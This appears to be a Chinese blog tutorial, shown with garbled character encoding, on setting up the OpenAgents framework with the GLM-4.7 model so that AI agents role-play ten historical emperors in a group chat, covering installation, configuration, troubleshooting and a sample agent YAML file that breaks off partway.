.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯LucianaiBã€‚</p>
<h2 data-id="heading-0">å†å²åå¤§å¸ç‹æ‹‰åˆ°ä¸€ä¸ªç¾¤èŠä¼šå‘ç”Ÿä»€ä¹ˆäº‹ï¼Ÿæœ±å…ƒç’‹ç›´æ¥å¼€å–·</h2>
<p>è¯ä¸å¤šè¯´ï¼Œç›´æ¥çœ‹æ•ˆæœï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dd5cac78ea8419cb8770518dac5d317~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=RBaNJLazsLH7DTJPW4krNaF5000%3D" alt="img" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ce5de07aaab49e99b94b1a70d57403d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ae8cQ6kWC%2F6L7VUZNKlgg81QkSo%3D" alt="img" loading="lazy"/></p>
<p>æœ¬é¡¹ç›®å·²å¼€æºï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOnePieceLwc%2FOpenAgents-GLM" target="_blank" title="https://github.com/OnePieceLwc/OpenAgents-GLM" ref="nofollow noopener noreferrer">github.com/OnePieceLwcâ€¦</a></p>
<h2 data-id="heading-1">å¼•è¨€ï¼šä»çŸ­å‰§çµæ„Ÿåˆ°AIå®éªŒ</h2>
<p>æœ€è¿‘æ²‰è¿·äºåœ¨æŸæœçœ‹çˆ½æ–‡çŸ­å‰§ï¼Œå…¥å±€å°±æ˜¯ã€Š<strong>æˆ‘çš„è§†é¢‘é€šä¸‡æœï¼šå¼€å±€ç›˜ç‚¹åå¤§å¸ç‹</strong>ã€‹ï¼ŒAIå‘å±•çš„ç°åœ¨ï¼ŒAIçŸ­å‰§è¶Šæ¥è¶Šå¾—åˆ°æ›´å¤šçš„æ”¯æŒï¼Œï¼ˆå°é“æ¶ˆæ¯ï¼šæ˜å¹´æŸéŸ³ä¼šå¯¹AIçŸ­å‰§åŠ æå¾—çš„æ”¯æŒï¼‰,çœ‹å®ŒçŸ­å‰§ä¹‹åå°±æ˜¯ç›˜ç‚¹åå¤§å¸ç‹ï¼Œç»™æ’äº†ä¸€ä¸ªæ’è¡Œæ¦œï¼Œä½†æ˜¯ä»–ä»¬ç›´æ¥æ²¡æœ‰å‘ç”Ÿæœ‰è¶£çš„æ•…äº‹ï¼Œæ—¢ç„¶ä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜ï¼Œä¸èƒ½ç•™ä¸‹è¿™ä¸ªé—æ†¾ï¼Œæˆ‘å°±æƒ³ä½œè€…åˆ›é€ æ’è¡Œæ¦œï¼Œé‚£ä¹ˆ<strong>æˆ‘æŠŠã€Šåå¤§å¸ç‹æ‹‰åˆ°ä¸€ä¸ªç¾¤èŠã€‹ä¸€èµ·ç»™æˆ‘å¹²æ´»è®¨è®ºï¼Œä¸€èµ·è®¨è®ºäº‹æƒ…ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆæœ‰è¶£çš„äº‹å‘¢ï¼Ÿ</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35153e97d9aa4c58aaab35cdaaaf2d64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=mCAPNKO%2F8JCXhgZtytAiZ55OrZo%3D" alt="img" loading="lazy"/></p>
<h2 data-id="heading-2">ç›¸å…³æŠ€æœ¯æ ˆ</h2>
<p>ç®€å•æ¥è¯´å°±æ˜¯ï¼Œæœ¬æ¬¡é‡‡ç”¨çš„æ˜¯OpenAgentsæ­å»ºä¸€ä¸ª<strong>ç½‘ç»œä¸­å¿ƒï¼ˆç¾¤èŠï¼‰</strong>ï¼Œæ­å»ºå¤šä¸ª<strong>æ™ºèƒ½ä½“**</strong>ï¼ˆå¸ç‹ï¼‰ï¼Œ**ç”¨GLM - 4.7ç»™è¿™äº›ç»™èµ‹äºˆçµé­‚ã€‚</p>
<h3 data-id="heading-3">OpenAgents</h3>
<p>è¿™æ˜¯ä¸€ä¸ªå¼€æºçš„é¡¹ç›®ï¼Œåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenagents-org%2Fopenagents" target="_blank" title="https://github.com/openagents-org/openagents" ref="nofollow noopener noreferrer">github.com/openagents-â€¦</a></p>
<p>OpenAgents æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œç”¨äºåˆ›å»º AI ä»£ç†ç½‘ç»œï¼Œå¹¶å°†ä»£ç†è¿æ¥åˆ°ç½‘ç»œä¸­ä»¥å®ç°å¼€æ”¾åä½œã€‚æ¢å¥è¯è¯´ï¼ŒOpenAgents æä¾›äº†ä¸€ä¸ªåŸºç¡€çš„ç½‘ç»œæ¶æ„ï¼Œä½¿ AI ä»£ç†èƒ½å¤Ÿæ— ç¼è¿æ¥å’Œåä½œã€‚åœ¨ OpenAgents ä¸Šçš„æ¯ä¸ªä»£ç†ç½‘ç»œéƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ç¤¾åŒºï¼Œåœ¨è¿™é‡Œä»£ç†å¯ä»¥å‘ç°åŒä¼´ã€åˆä½œè§£å†³é—®é¢˜ã€ç›¸äº’å­¦ä¹ å¹¶å…±åŒæˆé•¿ã€‚å®ƒä¸å—åè®®é™åˆ¶ï¼Œå¯ä¸æµè¡Œçš„å¤§å‹è¯­è¨€æ¨¡å‹æä¾›å•†å’Œä»£ç†æ¡†æ¶é…åˆä½¿ç”¨ã€‚</p>
<blockquote>
<p>å°±æ˜¯å¯ä»¥æƒ³è±¡å¤šä¸ªå‘˜å·¥åŒæ—¶ç»™ä½ å·¥ä½œï¼ŒæŠŠåå¤§å¸ç‹æ‹‰åˆ°ç¾¤èŠä¸€èµ·ç»™æˆ‘çŒ›çŒ›å¹²æ´»è®¨è®ºæ—¶æ”¿é—®é¢˜ç­‰ã€‚</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d7bb32191334c5197119ebc81629bed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=7dEatIgbl8qdrY1g%2FOvBZB7JvIc%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-4">GLM - 4.7</h3>
<p>GLM-4.7 æ˜¯æ™ºè°±æœ€æ–°æ——èˆ°æ¨¡å‹ï¼Œåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bigmodel.cn%2Fglm-coding%3Fic%3D4G1ARPDRUV" target="_blank" title="https://www.bigmodel.cn/glm-coding?ic=4G1ARPDRUV" ref="nofollow noopener noreferrer">www.bigmodel.cn/glm-coding?â€¦</a></p>
<p>GLM-4.7 é¢å‘ Agentic Coding åœºæ™¯å¼ºåŒ–äº†ç¼–ç èƒ½åŠ›ã€é•¿ç¨‹ä»»åŠ¡è§„åˆ’ä¸å·¥å…·ååŒï¼Œå¹¶åœ¨å¤šä¸ªå…¬å¼€åŸºå‡†çš„å½“æœŸæ¦œå•ä¸­å–å¾—å¼€æºæ¨¡å‹ä¸­çš„é¢†å…ˆè¡¨ç°ã€‚é€šç”¨èƒ½åŠ›æå‡ï¼Œå›å¤æ›´ç®€æ´è‡ªç„¶ï¼Œå†™ä½œæ›´å…·æ²‰æµ¸æ„Ÿã€‚åœ¨æ‰§è¡Œå¤æ‚æ™ºèƒ½ä½“ä»»åŠ¡ï¼Œåœ¨å·¥å…·è°ƒç”¨æ—¶æŒ‡ä»¤éµå¾ªæ›´å¼ºï¼ŒArtifacts ä¸ Agentic Coding çš„å‰ç«¯ç¾æ„Ÿå’Œé•¿ç¨‹ä»»åŠ¡å®Œæˆæ•ˆç‡è¿›ä¸€æ­¥æå‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63990fdd823b40ac8ef74d499eeca246~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=BLyh%2BFvdHG5BV%2FrXKR%2F7s43%2BvtM%3D" alt="img" loading="lazy"/></p>
<blockquote>
<p>åå¤§å¸ç‹æä¾›ä¸Šé¢çš„æ¡†æ¶æ˜¯æœ‰äº†ï¼Œä½†æ˜¯åªæ˜¯ä¸€ä¸ªç©ºçš„æ¡†æ¶ï¼Œè€Œç”¨ GLM - 4.7 æˆ‘ä»¬å°±å¯ä»¥ç»™æ¯äººèµ‹äºˆä»–ç‹¬ç‰¹çš„çµé­‚ã€‚</p>
</blockquote>
<h2 data-id="heading-5">åˆå§‹åŒ–ï¼šOpenAgents éƒ¨ç½²</h2>
<p>ç”±äºè¿™ä¸ªå¼€æºé¡¹ç›®ç›®å‰æ²¡æœ‰ç›¸å¯¹å®Œæ•´çš„æ•™ç¨‹ï¼Œæœ¬æ¬¡åŠ å…¥è¯¦ç»†çš„å®‰è£…éƒ¨ç½²ä»¥åŠç¤ºä¾‹æ•™ç¨‹ã€‚</p>
<h3 data-id="heading-6">å®‰è£…éƒ¨ç½² OpenAgents</h3>
<p>åœ¨æœ‰pythonç¯å¢ƒçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ PyPI å®‰è£… OpenAgents</p>
<pre><code class="hljs language-Plain" lang="Plain">pip install openagents
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d2674605e724c6a835ce9772f0c3d61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=A4Aikef1YG%2BIWODEd8LMmbKRGUY%3D" alt="img" loading="lazy"/></p>
<p>å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ï¼Œæ¥åˆ¤æ–­æ˜¯å¦æˆåŠŸå®‰è£…</p>
<pre><code class="hljs language-Plain" lang="Plain"> openagents --version  //æˆ‘å®‰è£…çš„æ˜¯0.8.4
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c545722e9f1417586c779ef2cb74f71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=B%2FNtW5QqzMyOcSyYX70dbWPMxPs%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-7">åˆ›å»ºå¹¶å¯åŠ¨é¦–ä¸ªç½‘ç»œ</h3>
<p>åœ¨openagentsä¸­æœ‰ä¸€ä¸ªç½‘ç»œä¸­å¿ƒï¼Œç®€å•ç†è§£å°±æ˜¯æœ‰ä¸€ä¸ªä¸­æ¢å»æ§åˆ¶å…¨å±€ï¼Œåœ¨è¿™ä¸ªç½‘ç»œä¸­å¿ƒï¼Œå¯ä»¥é…ç½®æ™ºèƒ½ä½“ç­‰ã€‚</p>
<p>åœ¨å¯åŠ¨ä»»ä½•ä»£ç†ä¹‹å‰ï¼Œéƒ½å¿…é¡»å¯åŠ¨ OpenAgents ç½‘ç»œï¼ˆä¹Ÿç§°ä¸ºâ€œä¸­å¿ƒâ€æˆ–â€œæœåŠ¡å™¨â€ï¼‰ã€‚</p>
<pre><code class="hljs language-Plain" lang="Plain">openagents init &lt;é¡¹ç›®ç½‘ç»œåç§°&gt;  //&lt;é¡¹ç›®ç½‘ç»œåç§°&gt;æ”¹æˆä½ ç›´æ¥çš„é¡¹ç›®åç§°ï¼Œæˆ‘å°±ç®€å•ç›´æ¥å‘½åä¸ºç½‘ç»œ
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aedd8a5679464e8787727c7b5ef15446~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=GQ8yOImcUBGUmVXEnZLg9ZJ3GlI%3D" alt="img" loading="lazy"/></p>
<p>ä¸€å¥æŒ‡ä»¤å°±å¯ä»¥å¯åŠ¨ç½‘ç»œã€‚</p>
<pre><code class="hljs language-Plain" lang="Plain">openagents network start
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dddbcf2a9afb48a88c73812c2cc8462a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=plCgVgGa4s9%2BDZfTLdeUgcJ5jmg%3D" alt="img" loading="lazy"/></p>
<p>å¯åŠ¨åä¼šè‡ªåŠ¨æ‰“å¼€ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8700%2Fstudio%2F%25EF%25BC%258C%25E9%25A6%2596%25E6%25AC%25A1%25E7%2599%25BB%25E5%25BD%2595%25E7%259A%2584%25E8%25AF%259D%25E9%259C%2580%25E8%25A6%2581%25E8%25BF%259B%25E8%25A1%258C%25E4%25B8%2580%25E4%25BA%259B%25E5%259F%25BA%25E7%25A1%2580%25E7%259A%2584%25E9%2585%258D%25E7%25BD%25AE%25EF%25BC%258C%25E7%25BD%2591%25E7%25BB%259C%25E7%259B%25B4%25E6%258E%25A5%25E9%25BB%2598%25E8%25AE%25A4%25E8%25BF%259E%25E6%258E%25A5%25E5%258D%25B3%25E5%258F%25AF%25E3%2580%2582" target="_blank" title="http://localhost:8700/studio/%EF%BC%8C%E9%A6%96%E6%AC%A1%E7%99%BB%E5%BD%95%E7%9A%84%E8%AF%9D%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9A%84%E9%85%8D%E7%BD%AE%EF%BC%8C%E7%BD%91%E7%BB%9C%E7%9B%B4%E6%8E%A5%E9%BB%98%E8%AE%A4%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF%E3%80%82" ref="nofollow noopener noreferrer">http://localhost:8700/studio/ï¼Œé¦–æ¬¡ç™»å½•çš„è¯éœ€è¦è¿›è¡Œä¸€äº›åŸºç¡€çš„é…ç½®ï¼Œç½‘ç»œç›´æ¥é»˜è®¤è¿æ¥å³å¯ã€‚</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73f10a231ef748e8a9931f6e1d36b175~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=LGgJ7wokLVZNzTHi3h2uxqLmc7A%3D" alt="img" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7413b37bfb47429b8904b7c3cf2efed4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=RdR%2BnjTJmBCzBGgoiw5j5ZoMVFk%3D" alt="img" loading="lazy"/></p>
<p>æˆåŠŸç™»å½•åä¼šæ˜¾ç¤ºå¦‚ä¸‹ç•Œé¢ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e48330322e14c91b2f80183b2687553~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=W09QAA%2BviE32FTa%2BcVB0NmJEIK0%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-8">é…ç½® GLM - 4.7</h3>
<p>ç‚¹å‡»å·¦ä¾§ç¬¬äºŒä¸ªæ™ºèƒ½ä½“æœåŠ¡ï¼Œç°åœ¨<code>é»˜è®¤æ¨¡å‹</code>ï¼Œä¹Ÿå°±æ˜¯ä¸ºæ­¤ç½‘ç»œä¸­çš„æœåŠ¡ä»£ç†é…ç½®é»˜è®¤çš„ LLM æ¨¡å‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9320edf29e2c407799bc9a83020540dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=wdBQkTkTwSZaX%2BCz2oME56rA62Q%3D" alt="img" loading="lazy"/></p>
<p>ğŸš€ ç‚¹å‡»é“¾æ¥è¿›è¡Œæ³¨å†Œä»¥åŠè·å–APIï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bigmodel.cn%2Fglm-coding%3Fic%3D4G1ARPDRUV" target="_blank" title="https://www.bigmodel.cn/glm-coding?ic=4G1ARPDRUV" ref="nofollow noopener noreferrer">www.bigmodel.cn/glm-coding?â€¦</a>ï¼Œç‚¹å‡»ä¸Šæ–¹çš„API Keyï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„å¯†é’¥ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00668534fe4d4272a4cfa46194f4404e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=1qGETtqH%2BU68NB37YbJrLZ5ekrk%3D" alt="img" loading="lazy"/></p>
<p>ç„¶åå›æ¥OpenAgentsçš„ç½‘ç«™ï¼Œè¾“å…¥ä¸€ä¸‹ä¿¡æ¯ï¼š</p>
<blockquote>
<p><strong>æä¾›å•†</strong>ï¼šCustom OpenAI Compatible
<strong>Base URL</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopen.bigmodel.cn%2Fapi%2Fpaas%2Fv4" target="_blank" title="https://open.bigmodel.cn/api/paas/v4" ref="nofollow noopener noreferrer">open.bigmodel.cn/api/paas/v4</a>
<strong>æ¨¡å‹åç§°</strong>ï¼šglm-4.7
<strong>API å¯†é’¥</strong>ï¼š***ï¼ˆæˆ‘ä»¬åœ¨ä¸Šæ–¹å¾—åˆ°çš„API Keyï¼‰</p>
</blockquote>
<p>åœ¨è¾“å…¥åï¼Œç‚¹å‡»ä¸‹æ–¹çš„æµ‹è¯•å¯ä»¥ç›´æ¥çœ‹åˆ°æ˜¯å¦å¯ä»¥ä½¿ç”¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/108736e8d5604aca870b70f75c36072f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=%2FsXL0S2utk09bdfMf1CvsE2%2BnQI%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-9">å¯åŠ¨ç¬¬ä¸€ä¸ª Demo</h3>
<p>ä¿®æ”¹åœ¨agentsä¸­çš„charlie.yamlä¸­ä»£ç ï¼ŒæŠŠç¬¬8è¡Œçš„ model_name æ”¹ä¸º glm-4.7ã€‚ï¼ˆä¿®æ”¹ç¤ºä¾‹å¦‚ä¸‹å›¾ï¼‰</p>
<blockquote>
<p>è¿™æ˜¯å› ä¸ºé»˜è®¤ç”¨çš„gpt 4çš„ä½“éªŒæ¨¡å‹ï¼Œæ‰€ä»¥ä¿®æ”¹ä¸ºæˆ‘ä»¬è®¾ç½®çš„æ¨¡å‹ glm-4.7</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/025e9fd6ef3c4b21b021500c69281cfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=foB9J8iZSxJ7M7F4MvDAx5JjErY%3D" alt="img" loading="lazy"/></p>
<p>å¯åŠ¨<code>charlie</code>è¿™ä¸ªä»£ç†ï¼Œè¿™ä¸ªå¯ä»¥çœ‹ä½œå°±æ˜¯æˆ‘ä»¬å½“ä¸­çš„ä¸€ä¸ªäººç‰©ã€‚</p>
<pre><code class="hljs language-Plain" lang="Plain">openagents agent start agents/charlie.yaml  // charlie.yamlå°±æ˜¯å¼€å¯å¯¹åº”çš„äººç‰©
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc01c33b28584189b46dde8f0725eddb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=2qF8kizHGByF3AgQd93OuPSkQoc%3D" alt="img" loading="lazy"/></p>
<p>ç„¶åå†åˆšæ‰çš„ç½‘ç»œä¸­çš„å³ä¸Šè§’ç‚¹å‡»è¿”å›ç”¨æˆ·æ§åˆ¶å°ï¼Œç‚¹å‡»è¿›å…¥ï¼Œå°±æ˜¯æ‰“å¼€åˆ°æ™®é€šç”¨æˆ·çš„ç•Œé¢ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f76bb06259b946fc8a88aacf6ac2c4f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=00XqnJ0n5MQbO8lZiZa6vL8PLhM%3D" alt="img" loading="lazy"/></p>
<p>ç‚¹å‡»å·¦ä¾§çš„ç¬¬äºŒä¸ªï¼Œå¯ä»¥çœ‹åˆ°charlieçš„å‰è¾¹æ˜¯ä¸€ä¸ªç»¿è‰²çš„äº®ç‚¹ï¼Œå°±æ˜¯ä»€ä¹ˆå¯åŠ¨æˆåŠŸã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18f6dbd9bacf4968a8e6bd0b0386d5f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ald%2FkATyEuUuO2KrXAymxglHwyI%3D" alt="img" loading="lazy"/></p>
<p>æˆ‘ä»¬ç®€å•çš„é—®ä¸€ä¸ªé—®é¢˜ï¼šä½ æ˜¯è°ï¼Œä½ å¯ä»¥å¹²ä»€ä¹ˆ</p>
<p>å¯ä»¥çœ‹åˆ°æˆåŠŸçš„ç»™äº†æˆ‘ä»¬ä¸€ä¸ªå›ç­”ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„Demoã€‚åå°çš„ cmd ä¸­ä¹Ÿæ˜¯å¯ä»¥çœ‹åˆ°ä»–çš„è¿è¡Œè¿‡ç¨‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0205f21f7a0646f297540118099d595c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ORmTZbJLTGvy2GkZuPSF2vTcKIM%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-10">å¸¸è§é—®é¢˜ï¼š</h3>
<h4 data-id="heading-11">1.ä¸å›ç­”å¹¶ä¸”åå°ç›´æ¥ç»“æŸ</h4>
<p>æœ‰æ—¶å€™ä¼šé‡åˆ°å¦‚ä¸‹é—®é¢˜ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c79cd57567c045f59d52672305e3c564~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=hYVaEECKYng8bAugfyCrvXrn0Rg%3D" alt="img" loading="lazy"/></p>
<p>ä¸ä»…AIä¸å›ç­”ï¼Œå¹¶ä¸”åå°ç›´æ¥ç»“æŸï¼Œè¿™æ˜¯å› ä¸ºç¯å¢ƒå˜é‡çš„é—®é¢˜æ²¡æœ‰é…ç½®æˆåŠŸï¼Œæˆ‘ä»¬åªéœ€è¦ä¸‹é¢2ä¸ªæŒ‡ä»¤å°±å¯ä»¥æˆåŠŸçš„è§£å†³é—®é¢˜ã€‚</p>
<pre><code class="hljs language-Plain" lang="Plain">$env:OPENAI_BASE_URL = "https://open.bigmodel.cn/api/paas/v4"
$env:OPENAI_API_KEY  = "ã€Šglm-4.7çš„API Keyã€‹"
</code></pre>
<p>ç„¶åå†å¯åŠ¨å°±å¯ä»¥äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47e962f0315d48ce9f0dc2078ad35db0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=fNgf4EhYV6AkLVdkkb6Rr9bqbm0%3D" alt="img" loading="lazy"/></p>
<h4 data-id="heading-12">2.å¿˜è®°ç®¡ç†å‘˜å¯†ç </h4>
<p>å¦‚æœåœ¨ä¸‹é¢çš„è¿™ä¸€æ­¥ï¼Œå¿˜è®°å¯†ç ï¼Œå¯ä»¥è¯•è¯•ä½¿ç”¨é»˜è®¤çš„å¯†ç ï¼šadmin</p>
<p>å¦‚æœå®åœ¨æ²¡åŠæ³•å°±æ˜¯ç®€å•æœ‰æ•ˆçš„é‡æ–°å®‰è£…ï¼š</p>
<pre><code class="hljs language-Plain" lang="Plain">pip install --upgrade openagents  // é‡æ–°å®‰è£… openagents æœ€æ–°ç‰ˆæœ¬
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6005912bd467447899bee3ebc39587b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=PAkTTo34UdIpsyjvxHDrsvyh1eA%3D" alt="img" loading="lazy"/></p>
<h4 data-id="heading-13">3.Agents çš„ yamlé…ç½®ä»‹ç»</h4>
<p>åœ¨æ³¨é‡Šä¸­åŠ å…¥äº†è¯¦ç»†çš„ä»‹ç»ã€‚</p>
<pre><code class="hljs language-YAML" lang="YAML"><span class="hljs-comment"># ä»‹ç»æ™ºèƒ½ä½“</span>

<span class="hljs-attr">type:</span> <span class="hljs-string">"openagents.agents.collaborator_agent.CollaboratorAgent"</span>
<span class="hljs-attr">agent_id:</span> <span class="hljs-string">"æ™ºèƒ½ä½“"</span>                            <span class="hljs-string">//æ™ºèƒ½ä½“åç§°</span>

<span class="hljs-attr">config:</span>
  <span class="hljs-attr">model_name:</span> <span class="hljs-string">"glm-4.7"</span>                      <span class="hljs-string">//æ™ºèƒ½ä½“ç”¨çš„æ¨¡å‹</span>

  <span class="hljs-attr">instruction:</span> <span class="hljs-string">|
    You are ****                             //æ™ºèƒ½ä½“çš„ä»‹ç»
</span>
    <span class="hljs-attr">YOUR ROLE:</span>
    <span class="hljs-string">Reply</span> <span class="hljs-string">to</span> <span class="hljs-string">other</span> <span class="hljs-string">human</span> <span class="hljs-string">***</span>                 <span class="hljs-string">//æ™ºèƒ½ä½“çš„è§„åˆ™</span>

    <span class="hljs-attr">BEHAVIOR:</span>                                <span class="hljs-string">//è¡Œä¸ºå‡†åˆ™</span> 
    <span class="hljs-bullet">-</span> <span class="hljs-string">Be</span> <span class="hljs-string">warm</span> <span class="hljs-string">and</span> <span class="hljs-string">welcoming</span>

